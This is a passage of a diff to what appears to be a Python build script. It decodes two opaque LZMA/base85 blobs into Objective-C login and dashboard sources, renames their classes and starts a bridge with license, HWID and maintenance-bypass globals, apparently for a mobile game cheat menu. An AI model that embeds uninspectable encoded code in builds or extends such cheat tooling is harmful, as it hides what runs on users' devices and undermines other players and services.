+         '1|9^vk;!2PvXEz#T4?_0Nfwt!kW-zRs0+}+*XCCOVi<AL_-lD$c|3Q`o|$*&zo@u!NhBJvm}NzcG!tFta9)_mJg9G*9ob>lTfsvr#24Sy$X+5?U?q|x)JMdE'
+         'vvIk(2whBcUV9+bF=kSw;#LuWJRkm!h(0Dmn?CN6iRR!Up5#dwGYBytptommiYs8}8=!GVXcj}xBgyq+X%TY9rTHrU_-CsKjjDgA@bRXHhlLc8mrWRP3y+z$'
+         'k}F^d);OBx`h<Lld(NV;I-^--*W^&~0K26y=Xg(O>Fx%v2vW>cADhXNC+_b1XM>issN2jxRd2{*1xV=Xqr^@_!9pI&07U%op;9wttglc6@t68e8+cI{c96Gc'
+         '>!^(hc8rb99uUM6vY%&BkrgMK>CdDCoIr=<FeYG16oygy!_;1?qJwC(l<bXv0imfS&|cudHC9;%E$0{Dt#W>vz|>T(+8Jk?Z-}&GWG4<Skf9mnl5h=1M~GqF'
+         ')5u!>@L9#IapmB6?>s-Vw<)Y=^Fl}RR5=KZun4f{H#F(UgI`JJ0|rww9mL5t$EI&RhQ3u|@z={tnFDdV?rKIB!M1bngXMdJ$gf7R58;VNZ=>hVBJ<vHT=M{z'
+         'poVO5>v_BMbKv56r^<YP2Dd7_)Hxg**Ho2kyY4m<sXAgt$?q-R=OI1HZ+tZEU-Gku&YBApSMwLz|0XAOTuHpyC_SC6So3JO!;_L?v*xC@iXd4(jzWyr>`@sB'
+         '4m^@)h!l=#Y6=&4q2#W`CD-D^C}|QDIFD2`v2}J_nYssr2g8-jD3P1v9&2iC^9WJ#8s$$poRN2WOt!G`aD0(L`pGkMl_*8>2mGsh=k*Pj_~i6(w065aqmlPV'
+         '9gUrBS~@!!2WOBS4BG{)#OG3bR*J+ICX)HCAg=vDCCPT{byuDW=m+Mw@C|7DFfx!1ghIqwD%ZD*z-A{zCwG1VeKQ9_lx!lI=e1X4-xf(;>tq4$;w-<f`2NYW'
+         's*xx}cuenvVu_$=+ZJaA-~;Cqz7)&U&heoyoSNb!)vhEH-vEZNd4K+wXUx#`Q_C<==Z2)yrI8Dw<B4{Sx9dxTNeLJAt7Pl?pg+BY1B4Ei@{%~W-zHnqth-d!'
+         'g=!mFL2mHR8!6$HMr4DH*jvnSrcje;YjiZk#)N27Xcw0`D}h?+clX#d4sbW#>}KrC;Bm&>Aw`2mhuHOrfierJRk1+Osf!j0y?hTie8hLo*(Wrq4m!QFS^6i0'
+         '+)*m=MIx$wPhB)idLdhw{1?ESz<D!C)oXi&VnOR^1PTj&MWtIR++=KamkbRQ7xfOx8B_%Zw><T)-wXTjuW0MDG2NhcrHB@!^DxA(1Z*sfn5;1=(KoX{YAaog'
+         '@^i<yZ>_VfmlvUMb>GN5PdU}|rmXIV6rfgEzY&a8x}ycoa~_Qq9*~n%@78t~0+d#Rb4b%=IKiAex#)pN1j_R#z`>V3l>OU~(!uLNs)6#kQF;PX{_4Tc!uPI`'
+         '(_uxjPGk*yKgZ+IUEpvd3im<3LKTrQD-x6}wq!nxqQ9%16!f=nmezSN*rdx@0vsoj-a`n<{&dH?OT+Dxdk31c=n>8<fvDS6e0#L4(xZl)2|^Zgd^wB`aS$L?'
+         '!*;<<adta3DW(mFDTV|$sKz*3^E+cV<AF7!fnKx6D~>hjseQ%sm$BHBz(M!H>fdml)kbnYv3Fd~P`>QQ@;k<AV8`P0-I`}Y-{#JOXw_X6*j|hYg*Q{aa^b%K'
+         'mXxId=0oN`r=!22IOX~N)phcT?uQWZtdl4Gr%P4#7mg<%aaj%uz*=O51;$9KTWYsbk>lnncE>hSWiVA2XtnE@*@}_Z47FWXFe20M(`*}t<5yeOZ9uSM`BD%u'
+         ')HC{7xD+{YFc2g%L}i^|0QZB^E|Gwx2COQ8MDCtvr=%F?ZT$Z=)@$NhaG%`fta$&Ivt{u)Mm_CN#&A0PiA`3q@H}V0Q~&?~B~SytW4U2r00HPY`i}wtiFTKn'
+         'vBYQl0ssI200dcD'
+        )
+        NEW_DASH_LZMA_B85 = (
+         '{Wp48S^xk9=GL@E0stWa761SMbT8$j;I7LZU0nbXnn|ZK_|_|Nnn!!VxHbD4o=s&Wb8xa6TLeA&!zBTkhTyTPxYVwtAKGBYeg)ipprmo0ZGe8Y(y9u1E~Ja$'
+         'QgV}-KwMYgQl$AhKFU7L?%79yhCZlZA?=u}fRkg88*@NlvkMi?@`uqozMRXlmc35CrMbO%v&t9AD%>>|0}0OnGu1{yY)gUE@`)Yk1F+_@Yc!!MZ))e23*Ium'
+         'vPhS+hOt|kn9L2n(G9<cJKUExX=-P`&ttV(P^xF0B)%Smm3*$ndVlNs`A8cRJ=$)P%#Vn9f&!SP^|k7!fm1wb9}=<n<YUn$&b|oqvz$PrFBZ3n>+AiabL(e5'
+         'nOxWvvEA88f?ok&`gb-0oc#4}OAtTKIQ-NK(%mZHTe9BFPjy+62G0bKk5gQ}4ad+~QiVayqaAHCm)X{hh+WC$DxWaEfKRg?`F;FFak7{V0r%1zR)n0tNrzKs'
+         '1{g{{wCaH-rOD-{pw~uUCg*aYQvRU2w?4}McxLS0#u80Pn$i~K<~OwQCCU%v7#j1qC40T#^AVTwoav?qiB<KUo~=DC>uv6cU^!JB++SfZRHn*hM|@aQQGB0('
+         'nr$~N>O}-2bL)`R53~Al7_dvvCMhx&x1CTrF5L#a4gI^}VX5$j_68muAz#x7e=Q}s>2sKvI<R(>c;pol1MHGGdQPGBLh@hlC$mxX`BXc1N)VvqI7|w3>jr=@'
+         'b~Y><pg*w;^gRxjiSx?iHfxK{_U9TC(6iW#tMfq#e0D!Bc<RI;c3x=wIuO}?8)bUhWa7zzgEf&3f&4ZJ>aV{INGorI5qr8-kWBov`rWkP(~+^N0&>a&$pDO>'
+         '8a<=;GVB@<(!vR$8M5n**Vicxx|>Xy=xg6yXX*?i+;$^Q#cUAX`|glwg-e9hz3yvvSH{6<Z&L^^Jkand|3U#g{Zy8^fpb)b_mLL=R&5WN`)FxpXA2tq>rVx_'
+         'G+b*-*|(!UNM4C$U>1Mwbsu#8lWjsE&-bUE>`v5eI4$e1_SYd29WAHCD2Pt@833!_b`#IbPE)~Uqph`woDP3)4YrrFV^ORS(X(~ng~&0q6glf;X#wVuN)VP_'
+         'T=<*r=9Bant1A^0A&MpG<hCii{G3lZGsR(j^+XG$`wcdz8hg8M0vIg0l*HWtkeFk7@%gpf>8eGI3N$E70}fxwc0;rD`sb+az{{;N%LauLjS52JNvvTpX+vS|'
+         '3_|z-2#58kt^*ZqRuaaXyjf5Do^3WHWd0O|lOJRd1dIulZBH`NDL9WYMt#>qC4X`4V>1k>->4A3lWv1q^B5A(e=989PJCr3i>-RHv`|@ZY<*sN_BV<2DcV`y'
+         '3@A;17=~r>zi=+;YU0XT)$r6?k^$yG#b6f$zI!or;(3@^^$DRVdb|I~ZSq0;C}x?2y>XU+BUL)=)VQ5wl&dX2^WZ}QUq9Jol2g7W>9sCw-B`~w8THNOg}675'
+         'd@7u>p>OP=k(caC_9Wab+cW(}#&}y3o?mJvEQNH*n~K7Wzf}2~@aAS>K#(TCVV9P%;)<3v!S;eP3YYlP+COf-WQTi4K3hlb<oLQ`c^t4rvgO3P2liD*6#<G`'
+         'Anzz2XAWHA;2!EuA!fo59ZTiph3`|cwL6I8%gBpb0g%0@a1G{ojCz`xP-0nll}BY<hl+`#)yK+oL+IFiTLCtg6cay`;gxINvfksB#G)^6<CGYyx|kr1CH(zv'
+         'Ml(<0w|Y)_n~K@?$8j|ZxIFwd%ct=a(?_gD--6!s1L$l*V-H{C9mYMMKOHL0WAW$EuEH+GClx500}9hWM8X(>YSVt&i|_C4{AKv+<q}1DVz!-;k(ck>dS1MB'
+         'ningob<IxBV(-mig!sSDAkS^UGM5Rp`~l9C{nvzy!Sc1!hupfd58VXkdF;&FzJ}A;V&>dy3DUUmTEALSnP#mQmoX%x)4%LUDo?*(Aj;EAoV$j-S;%^-epmkn'
+         'Oqw_~7dD7dc!AawRu4QrP-+F@+H|xI|HvST7V$KtxMvJc^2Mqbb%7*1#OSo*-{Juu^23(+7K%}qM25XA+@<fr$Q2Ln%RsU;p*S!<(_Z32hiV;wP^b|BP|vkK'
+         'Mo3^yKZ7(2Zrg?p(#@qBD(YAIvOh_lt~HGim)&(&58<*<bc-g#2(17?u29{wnYI{Dh<z~FUsG_dcep5ZvQSGK?9OpKISKlr4hREG=#WL8VY7^*O&YvDeq(M8'
+         'gsRNwx<OpZD(2>{wziG%DGsw^=X+6Km5Ri6Q2>0$*E&&N7;H+`zwJWbfna1j5y)hseB%KUWSALN_V~ql$@GkksA3$*AJ>A?45BuBS1W((=t8`?>@B?D*(vSA'
+         ')rARALzXMGR10x_46qZ+t^h6xlq=lonsNtiFP!G&P@rLMwQUd;9iNwLLa2YpI||VQmx03WX9!=vBTEF7)lWU=_2RFhlya(7Lo^a6a#wm77`9lyEvRI8_6Ikf'
+         'y865nrtXtE88z?k^s^3ew%M<8NwO@VoZe1B@+*GiLv^(Sc2|)_{9n~?*C2a!8U@z>^(UMgn?<M|1<;cQ-tVPz@9qN5l`EG->wEE0FN++XTA$|MCHsRk`rt%5'
+         'LNvIm29_4h2hANiSg7iRJ_U67uRjs_2x+cW^jJxGy!Ma}7hXvbY(;{HqwdzdLuy4kjm!n7pJ<c}HK+TA#`yFX9aGkn@hgAsIRC5WMZys<p!AO!JBERa_7l9`'
+         'q}{V(449)Rn7E{TtOm0!*RSwFIiRpe^2E(_9A%3X6&6@|W*oQ*U8d2JX+}{s#f^-xXK{A?iR9kKyWhP7(KXUt{&Vmgjz{=ENw!b;pLvb3j^TpKt6OT~#zMSY'
+         'asOS0*0_wpw$H?KbC;!oHe2AGAETu5i>Z7rXj*~kWL#^*$MKi4K_e(6tDrJkpY1bo&7<L&x!EG?vTqBZhjD=gHiJj17RE3r-aH?n1|4QwNJiTIY@jOcQ-kOU'
+         'F&qr0=x0Z{Jj<O2A6>SVq@$X4?B=*7_3`f7wQ>oJK<M`Cw5t74ghY^iiBCI4<=gOzgxd*V`s#-yX+#<+E=SFD6!?i2<#kE6?k~?puG8H@<<+QeysGgY!;YJ('
+         'xv4)v)ldymm+krJ$ep6(hO+No6o#B%ej<p^u7#Dr(}2?p8J5!llOR^#-dr4Eozibbxe>ICS&$TYz`GLbL9f_>Qv9b||J@4LA!$dLZ4c&fd36e7K%X2o#Oin#'
+         'M0Czb&s_(WDKje~;&?Uf?ZsSwU=mE<K=Bw>Li!<=;~{Tp_>D{)nw~e~`7=JCma#N`gwaaalwf=JXHUKU0*cwVxeg|UVouVTV^rOtM9ostFV!TLqnsS3KI(#-'
+         'Uw%1#xVY{#|DkpZ<^t9N!2&L3G7MVn1T_mp`HXHPl-(({DtZP#i`hOsiXu(Ka6PhM(;34dhZfDKX_{SHK2&&?piLV<76dbIjxjhW0@p615(<l2T8YK>w%_uq'
+         'GMbf>W&MLrjDGh{VyKr&=Q<I{Miu*8qXs%_k)0mBos#*j1sIx@=a7@(p&~7^*riYz%)OMc0np(>4WQ=}vr{kf{rVXDwwv=;<EA10p<3DcB0|zTEZ92YvY*Pr'
+         'mJE+z5lhRjp3E0tnbKQ)(TG4oX@6XI;3v4fjObz7`?M0&<!XGcRt@M){E!_|It7C|U^TfT8Ix?XA`on~WH`=6{?WxO&+9z8X0P!Zb@H@o{Rm?NM$Q6f$GT{P'
+         'Va|BaxxF|>KD(YVo;*Alm)EmxbuClSvtZr{R9p@%MitHV8@0^q)x4)jk_`j+#D*3*WT!zzIl(Rf*x8F)v$!V~U_{s^HhR!8RkxvHLE8UEfQP~uI`YGkmop>d'
+         '*xM&duwFxn&*(Q|qb&X{XfozCBMPZ{vyslIm8qlG1p4<cPC6)u2Z`~|pjS?p{f~}Y`Z0k^F~mu&9dQ0dfTC-Y4T%$`1n~TOu4VsosR4NKl3PcgLFX^FG<c8f'
+         'O-FwM;rQ$CEPX@cD_!(2?qWzq5hak^Bpo4SJQVCAoI2Zo{s&6_6}fU&C$f2u(pK*=a3yL?Ex@Y&zjA(y?iO_KH68w0EIX)33Pr0>%3FtfD%rgGd}Q7eOCTxA'
+         'Gy2Wh>V|yO`-U=zD%K9UK4~$$!%DAyjIhzR;gfD0``Wfm?gz6-RxuPRU@m>NFS@N6Q%$G#<jH<$<nSa^7Fd+ma1=se;UOAb6CKV!{D`)J3K(Fi=WQYWxqJ|t'
+         'I<FA&@YU=-)JbPlD~e~aXYmX3!V0HqhSs!E3VH2E=ynm!{<M5MS2}XXUe*aVYlus%zKR-7Z(Nlg-_-R=Gzr6~W>ZWLh3qXhE(G6JhnT8uL>&*8rTl2T0q+!g'
+         'ikn1V+Z?wzv~C1Zhqwv`<B1KjH2zg%<+cjr_f!K6p6E3YAl219GF3U?@+9sBAa*n^I?Kb_wOL<IMq`&2ckm<FApOKTIn8)GNr20Li|wNQprY!+i9D)l=20uv'
+         '@><Y}H>?It=6~2sZRJ~Fw!#lJlG~nbUQL?%$Y>iGC1O1da{dVl=)GKajl};Y;HXU)oQ(Av7*V}8AngXUrL;~<R(gVDj_Z(FxPS_@`kmB1D6g#g!#W87@Wsi*'
+         'u)u9oZ5e`|-PaXa4X9J3r=7`@``Z~(*=3GyYia0P3(_BvSLO$pK4+hybJ#2f{23%iD+TTlsS3)Q{-_xR`b`(%Zz~EACdeVO5>6aKl=nN--#vACP8`kkaP7oI'
+         'MHfVcU-&+WS^b`k>P&6?O``6r{Yx)TYiKyv`&NTUH>!+Gj+9NThg@^VGxIvE=%nQlwD8%+%ffW(82H<>Z_SO;ra<|($!7uLvh#=5uLYkDCmgkJvI5vT!uGq-'
+         '-Jpi-(w55D0+@}KG!D$Jzn;7GMBwXubDFExK9=qSgeQOca?ec*Dx(=$;wv32^J)yzg$|9s3>zA~BUVYTGf!WZZDeO=IEPCb%ttt<BjzQ8u{d;c`Mg-Ov_bRY'
+         'jNIe%6M>zeZiB39#SiPugIeuLL4C9`|L=9Z4?OhRGes9WP?<>mQILYHbhjm1Pr3@Yis*b&?2sp*vkg{)fYjok(I$u@-BgFPp2wif)VL4ISTJ8P8L^9rA*vRj'
+         '@4E2cD>dj{LgNsW2^p~!G(N89P&xv*?Td=U3|&i@#|QmFO^(i(0-bb+IVGS5!Vn;m#1f4Ri1XP0O5?v=VZLjk3m6(9dDr!#f_Sws-`%sS>a*e8{EY<T_Aa<a'
+         'CEP@*X4dP!AHA)F9isL6>gmW5bl^&*Qk72(@lhh7%^;P`s$nCoJ$N-|1077dcDY0sV1T6;=h-_}CYTJnE{zwv)5kqczS11FWm4Q5)22E_9rHd-qtMl>Dx3Cd'
+         'qrW<GS*tV2B~1nESlg)h`I*eMp!1#rULS{21R-cU&PHaEnO(QI2@ml}uxA8&<I9!F3bBIW^=deO?h|+*ALBWRyc&&q=g!vwu4{pz#!4a!oC`39cPg<GLvX(D'
+         '|J7yx%Yq&%CwCEx(x5&KuzY&b-IFnan!lYC3}!Md=SE^T%`ThP;W2x}4@K<~!uS?G%6g5e9AQ&D2{6yK53fu?r<Jy{%44%%Ah7k|6PDw$J6OQU4PGJkvJThs'
+         'x!i&AokhoZBIOQEsVfIut}qyWcGbFzPCNGvI*macesd8!gtOkb%2)s;Mxa{bK1>2xW3>jm0Y;&m5Kh{HJ?xIY%`Ac_zkrcLAj?T9T=KOM1b@;c)s49M@Y`ry'
+         'Ew{I$IPqCxvN7g#LwhlTQv7bDr*G+VEO*a`t_^_XL&3EINZfmN_64u_GiJo`gKcQGM5V#l7Kxal(DFANTR>J^(tItF;S(?Uy5UjKn{bi6Px0vfi~-T5?@{we'
+         '@m2K|NVi2jSpso5?0=;)a6$zCIr-gvt6%E{6ta&3h<l^yG0~@}Lp)Au@?7}u`Vuwev;APq_lx{vJ%{XTIb$3^QBTxGp&ulFxHe%%RJSBAbBo&tDd}Xo+C*Ba'
+         'pzpgU4h@%X0xPoe!iZn6uS<pnX?HBk`Y)(N8z!W#$6e(u{vHb}<aeTi?hBmikloR2jx-(U^sz5@QouOsFpjgK?;s?$x53o&6V5QsOB(e2BJ3E_4V*m==VR~B'
+         '6-rBAC#xIbGCc<%7|9fHwdGx`54`kZT<xvj{6Z@QA`$+2zQgLq$c7_24Ro3x4%q)D$=DIwnLlCy)TM{5OJbE>n(OSPLp;GuU%Q9kYIG|v5b=he`^@Rh6RX{t'
+         'YTY(H!$GRozpq?z(gS+B13Cz8;#5Pkyqwk37Or8IA4!ip@f`PKA$<%Cz%ibu8yr_jtSQ-QLSd~c__SA%2F9A3fjhSOIRZ8rxlM`n4oJYs;q!+>MXlJcq)#E#'
+         'p4Ve2^K85+(sr8Tksf!X!3Gl`MX<Not+U<FB+8bB99n-H_*VdrCq){et1R%TZwC_ZCeAsiGMl?Q!-{nuyPT{5<6ntYiFkZhGb<!|W!o6MrZ}k`U72clkk~OY'
+         'Pi6&IT~pJ64ZBU2fm7MhZuuA9Hf39`gHijEB{uXT6-=wBx>`TPMjUPzO&l*R-f&Y@cGQ{e9GnRWm8p`TylFP(Dx2r8V72{eaP&ZFkQy!TihEu@p_gc74<Ows'
+         'P31P6^01NSK)&vIFq5f3{Ot3cmeC{^S#x^qu^4681ADf-o)uARE#}^LC?`ZFlM>FHl{>B=x==$xd|K~83ieQqxY?jb`loJC#1;3|bY^72diwwQUo(X(tH0n6'
+         '5qk_{j5T{|`=RDp3ogz-g!UJ5UhU-sZ`jwqtfi`Pp3{Wi%)Uf8N9`XYAq@s)_zHL{1W#w7;LA+y7HNb29LM6;LN*l$G13K48Kw5i#>>viP!^{|Ss_%pSiB8~'
+         'HGZ|&iJV?7|0FB0+cgEGR{M^w0)va<(WvK)B(=**uq5u3FnpMHZPaCRMWlEI7_i7wv}%w|^*37zqEVxcIb1H%sMo>Oa(toDt*hl*D&#eg{|91)_P0+0TaCwA'
+         '=^XQj=4pQvv`E@)0z`)$1iUD@1`{o7EQkC`-TVy3^cpT0{?s88zcZYQ2@p>!aTv|qZ8Sx?vl(q1WRt&x)U)_MX!7fFI%W=KXuLY3K^J^J_w5;8kPhaDM1sO9'
+         '7r>&)7*HUr@M12q4JrAT5i~#_Pa~5DMf?nUKmM?6bN1>RhI1}LicUnI1e6%HTPTHbECa1DwmR->s9ucxOB-yR+#A2vS8A!vYX%J58i%Ez=n;DKgAtk4SlkM<'
+         'OoPowcRC<OZ=*!BSH*C`_jJS61Q`XST{;!?lPMNj+yUeVrE?%3l4ac5bFsl+55pOs%{6o3lnW$FWQ9iJoVfZexo>=xTIq&aAb+A(f~*onSPzS2zJ#1U^Z2Su'
+         '+u7*T*pGP2NeEq6@gt@KNgrHFs#E*+VnMoIA|$y~UN!c+g&GArWdP$BOHkQ;(&T@}HRV%fH-`P#_{A@1r+&0wp4vm1QW328w}`(#ypYcTyzeW|y*ALc<4WJ#'
+         '3h#N|zF*n5`@0v&9Ls5MzD9Rqfp@$*sdGs}JDpnyGN~1=PzaX~XRFZlp64L=W6J$p!Hk5VTQtCUy5CXuLl_U5l)HHPlfOR-j#MvFV{$^jEBrOG{&j)DrYf=m'
+         'Wy+JoFB3wFG`4U{VA7B^8l?^<hwWpXQtiK1|K)QzqhseQb<m6P0irYeDA{V{toag{86FHPr8k4iXXLhn9ETaLC2U|Wsz#0we1w4p`72X{ZmFUiM&~`I3Nq-~'
+         '?mabi<j_s<<FSb#+i@jjI9yAYhF<*pl?Zt@{6SK{V#1#rayjQ<stfOuQa-`K>xw<p1ap|Sy#%z~(f|>yoV-yNp-9BGXwna*t^EgAam#8wBR}hlQiY2VJmayI'
+         '+(K#-%PisF%%0s&>1EfZd*%aPuD6^47)`XS9-g47EE1gUVY1EM2=CI9QKoe^)B2TzI=^+<6wToUfvY?OLM!k*cmVspcvxf-PZ0mcIr!H^y%8)8VzD&Q$AD;a'
+         '8*k>upAGlY68@rC^3Yox$%*1!6g#P;M2J^e-Qe}<?oYmFZkNh^zP_$jr8&`CRX>5>jZ*cRK>^EN_9}{CWg685uSt2tl%v`=g!erGFy$&`O}GVQyZ~)^R&~>}'
+         'lxW{_46Ev+RJUsZ{+Gw$LHh?7p2P6U6E}iGLzTsrj<1PExDfD+TXoAh^7X<JY_pr|-!t&btAi@o9a09;VsZ7nh*8IL8`l_KrLRma@QCD^tkDi2#8^AyI>t}@'
+         '&`;>CXwpuExtJG0rBc~YMb%BiNgH1y00k`-Z<-3hQ7(GLn%^Ua(FadDS0@l9LH3NRW7_w>k`dOothdG&r$7OL7Pls1`mG;yXW^)$$t`st7Uo42b;&{Dr)6k)'
+         'ebIv?n{Ptdw<^%+hiU*i35IhYLMw(sw1~xc6NMy}*3`P7S|$rbFBhQY$(?00!A+dZ2E!4b6umwzCZ>wM)P3++I4)9FCq`{Y$6<jUw0{~hldv5y8>K6Gu>yUj'
+         '(jQEO0s%Uf(w@|uMp=Q(&Sd%~tp~g2&f=FFhF`f~!nDC8^nehk$6qW)?(b!AfFA#Yv5&0`U3@GZ$HQnKJoBWk@ptMb6AbHYYe@=$cm9Np&;$@}oc~A&{5cb|'
+         '1oowz_6iVbn??|Mg!znv)cZX}E4i!E+udq=y@)MD){LI+`zuf=TREmQo@4Y0wYb*E5-T|r{rkKUiXgyPg)T6u6)|ID%dwgDW(fc9F=9b0Cl+YtZPa|Wr7gDi'
+         'Gg@CPQ!p=8@VWDkoFE7+S{u&>GLX6X>V!E(1Tf^;bRjNs;ex-pd|-}(DmDz1iC<^g6XF&8h3<g3n0rxVqxm#m5W{bTF40u};%t&S`qKR4M;$3fB9~0;Wx4q)'
+         '8}Vo|iP}wPe*t)72FGAQg9X&7!A?^FK6{tkW8&jPvmpR$48_2=1;)7eFa_&n%vyC+=x9Afa=5E<4v#epnHehX9FwZP=?!PImtt0g$=oY;bwNcfD2;D5@tm!~'
+         '+PA3a+i;ntF?Ndrxu@~K=e4cru65hRC1UpA+?xMder6FWmYg&_9R(85pfkWsR20m!Z|mu3*<qPSPI@bl-?SNuW9`Yl$lT!?TBFT#3A*or+b!3Vi(c2)*wCEb'
+         'qvhV6Vo}so-~TZGuic2HfV=1#G${u*G`mEremh)&(<DBm?%lazwh5GtjrsEW_~RFfJ{>BztAm>J^u!7CQ^KagEb>LYq1^e0Kq?Ou8YrD?lQ#gSFYejU`<*Bd'
+         'CB^z~-_UWn=`9oriD`s7N$2kr@W2AWO}iCPIyeI1Yt6D#s~;0qfy@QFgcZI-OjzKXsg7JH++;YGh8N;3QF|8T+S#sJ=~3L?8ti7#^o#4?PrQu(XCFYZvvoFh'
+         '|Di4aU29cz`^K+7T$#L#KawoW(X{yZR~a4}PM7s<a$=?47WxlUxwj5CSYic%k9bEFqb-B{NTs8YK3$dD>*8Uu^dU;c7a$1zFc>+gi2v>33KWlOrqBAYbU8k;'
+         '?gjU)eg^SGtJFc^`>um#B^sgL^k{HzBrgN;&Bx7nQ=yZ5whleYw=j{yUMS4Cb<u&RN<>YL48(~q2A&7uB)<wlc?I`=0y)^^50mwpkEOb#d+a3z$x^qIPaIWg'
+         '{X44{_jUgm^rePRHgKI6t-R*R(d4uYhmaJEB&GHG2!jvz;+Z`Ac+K*@q+0uWgow`GVwFg=xaYvL0Z#%hIS3r7rHA6o(U4`tW`{NcB}7@S)?Gna2kFa4uka}d'
+         'DK99`XP4>axuiTTa~if-YYVuXT-7#{H7S%YoF&-#xfWdIU}RqToQ*LYiUCEh;^KKRprn6rgBn!L000008ktv=;CciW00H?r%-sS2bg8A0vBYQl0ssI200dcD'
+        )
+        open(login_p, "wb").write(lzma.decompress(base64.b85decode(NEW_LOGIN_LZMA_B85.encode("ascii"))))
+        open(dash_p, "wb").write(lzma.decompress(base64.b85decode(NEW_DASH_LZMA_B85.encode("ascii"))))
+        print("Installed Pure Liquid-Glass Login UI & Dashboard UI (FougoLoginViewController + FougoDashboardViewController)!")
+        if os.path.exists(login_p) and os.path.exists(dash_p):
+         login_raw = open(login_p, "r", encoding="utf-8", errors="replace").read()
+         dash_raw = open(dash_p, "r", encoding="utf-8", errors="replace").read()
+         dash_src = re.sub(r'#import\s+"ProtectedConfig[^"]*"', '#import "ProtectedConfig_Dash.h"', dash_raw)
+         dash_src = re.sub(r"\bint\s+main\s*\(","int fougo_dash_entry_main(", dash_src)
+         dash_src = re.sub(r"\bcopyHwidButton\b", "hwidCopyButton", dash_src)
+         dash_src = dash_src.replace("FFReadLE32", "FFReadBE32")
+         login_raw = re.sub(r"\bcopyHwidButton\b", "hwidCopyButton", login_raw)
+         all_dash_vcs = [
+          m.group(1)
+          for m in re.finditer(r"@interface\s+([A-Za-z_]\w*)\s*:\s*(?:UIViewController|UITableViewController|UINavigationController)", dash_src)
+         ]
+         dash_dels = [
+          m.group(1)
+          for m in re.finditer(r"@interface\s+([A-Za-z_]\w*)\s*:\s*\w+\s*<\s*UIApplicationDelegate", dash_src)
+         ]
+         dash_del_name = dash_dels[-1] if dash_dels else ""
+         best_vc = ""
+         best_score = -1
+         dash_init_sel = ""
+         for vc_cand in all_dash_vcs:
+          m_impl = re.search(rf"@implementation\s+{re.escape(vc_cand)}\b(.*?)@end", dash_src, re.S)
+          body_txt = m_impl.group(1) if m_impl else ""
+          score = len(body_txt)
+          u_body = body_txt.upper()
+          if "NECK" in u_body or "BODY" in u_body:
+           score += 500000
+          if any(excl in vc_cand.lower() for excl in ("color","picker","modal","popup","alert","splash")):
+           score -= 250000
+          if score > best_score:
+           best_score = score
+           best_vc = vc_cand
+           for m_meth in re.finditer(r"-\s*\(\s*void\s*\)\s*([A-Za-z_]\w*)\s*\{", body_txt):
+            m_name = m_meth.group(1)
+            if m_name in ("viewDidLoad","viewWillAppear","viewDidAppear","viewWillLayoutSubviews","viewDidLayoutSubviews","dealloc"): continue
+            if any(k in m_name.lower() for k in ("dash","main","panel","menu","setup","build","show","unlock","enter","load","initui")):
+             dash_init_sel = m_name
+             break
+         dash_vc_name = best_vc or (all_dash_vcs[-1] if all_dash_vcs else "")
+         APPLE_PREFIXES = ("UI","NS","CA","CG","CI","WK","AV","MT","CF","SC","SK","MK","CL","UT")
+         l_clss = sorted(
+          set(
+           m.group(1)
+           for m in re.finditer(r"@interface\s+([A-Za-z_]\w*)\s*:\s*[A-Za-z_]\w*", login_raw)
+           if not m.group(1).startswith(APPLE_PREFIXES)
+          ),
+          key=len,
+          reverse=True,
+         )
+         login_src = re.sub(r'#import\s+"ProtectedConfig[^"]*"', '#import "ProtectedConfig_Login.h"', login_raw)
+         login_src = re.sub(r"\bint\s+main\s*\(","int fougo_login_entry_main(", login_src)
+         for cls_name in l_clss:
+          login_src = re.sub(rf"\b{cls_name}\b", f"FougoLogin_{cls_name}", login_src)
+         login_src = re.sub(
+          r"(@(?:interface|implementation)\s+[A-Za-z_]\w*\s*\(\s*)([A-Za-z_]\w*)(\s*\))",
+          r"\1FougoLogin_\2\3",
+          login_src,
+         )
+         login_vcs = [
+          m.group(1)
+          for m in re.finditer(r"@interface\s+([A-Za-z_]\w*)\s*:\s*(?:UIViewController|UITableViewController|UINavigationController)", login_src)
+          if not any(excl in m.group(1).lower() for excl in ("color","picker","modal","popup","alert"))
+         ]
+         login_dels = [
+          m.group(1)
+          for m in re.finditer(r"@interface\s+([A-Za-z_]\w*)\s*:\s*\w+\s*<\s*UIApplicationDelegate", login_src)
+         ]
+         login_vc_name = login_vcs[-1] if login_vcs else ""
+         login_del_name = login_dels[-1] if login_dels else ""
+         print(f"All Dash VCs: {all_dash_vcs} -> Selected Dash VC={dash_vc_name} (init_sel={dash_init_sel}), Dash Del={dash_del_name}")
+         print(f"Detected Login classes: {l_clss} -> Login VC={login_vc_name}, Login Del={login_del_name}")
+         login_m_file = os.path.join(ff_dir, "fougo_unit_login.m")
+         dash_m_file = os.path.join(ff_dir, "fougo_unit_dash.m")
+         bridge_m_file = os.path.join(ff_dir, "fougo_unit_bridge.m")
+         login_o_file = os.path.join(ff_dir, "fougo_unit_login.o")
+         dash_o_file = os.path.join(ff_dir, "fougo_unit_dash.o")
+         bridge_o_file = os.path.join(ff_dir, "fougo_unit_bridge.o")
+         open(login_m_file, "w", encoding="utf-8").write(login_src)
+         open(dash_m_file, "w", encoding="utf-8").write(dash_src)
+         bridge_code = r'''
+        #import <UIKit/UIKit.h>
+        #import <Foundation/Foundation.h>
+        #import <QuartzCore/QuartzCore.h>
+        #import <CoreGraphics/CoreGraphics.h>
+        #import <objc/runtime.h>
+        #import <math.h>
+        #pragma clang diagnostic ignored "-Warc-performSelector-leaks"
+        #define WS_SET [NSCharacterSet whitespaceAndNewlineCharacterSet]
+        #define RGBA(r,g,b,a) [UIColor colorWithRed:(r) green:(g) blue:(b) alpha:(a)]
+        #define IS_DICT(x) ([(x) isKindOfClass:[NSDictionary class]])
+        #define IS_ARR(x) ([(x) isKindOfClass:[NSArray class]])
+        #define ST_NORM UIControlStateNormal
+        #define EV_TAP UIControlEventTouchUpInside
+        #define EV_DOWN UIControlEventTouchDown
+        #define JSON_DEC(d) [NSJSONSerialization JSONObjectWithData:(d) options:0 error:nil]
+        static BOOL g_AllowURL=NO;static BOOL g_DashOn=NO;static BOOL g_LicOK=NO;static BOOL g_ValBusy=NO;static BOOL g_MaintBypass=NO;static NSString*g_Key=nil;static UIWindow*g_Win=nil;
+        static UIView*g_MaintV=nil;static id g_LogDel=nil;static id g_DshDel=nil;static NSString*g_LStat=@"ACTIVE";static NSString*g_LPlan=@"30 DAYS VIP";static NSString*g_LExp=@"ACTIVE";
+        static NSString*g_LDLim=@"1 / 1";static NSString*g_DReg=@"YES";static NSString*g_DSlot=@"SLOT #1 (VERIFIED)";static NSString*g_SessId=@"SESS-ACTIVE";static NSString*g_LVal=@"VERIFIED • LIVE";static NSDictionary*g_Cloud=nil;
+        static NSString*g_Tunnel=nil;static NSTimeInterval g_SyncTs=0;
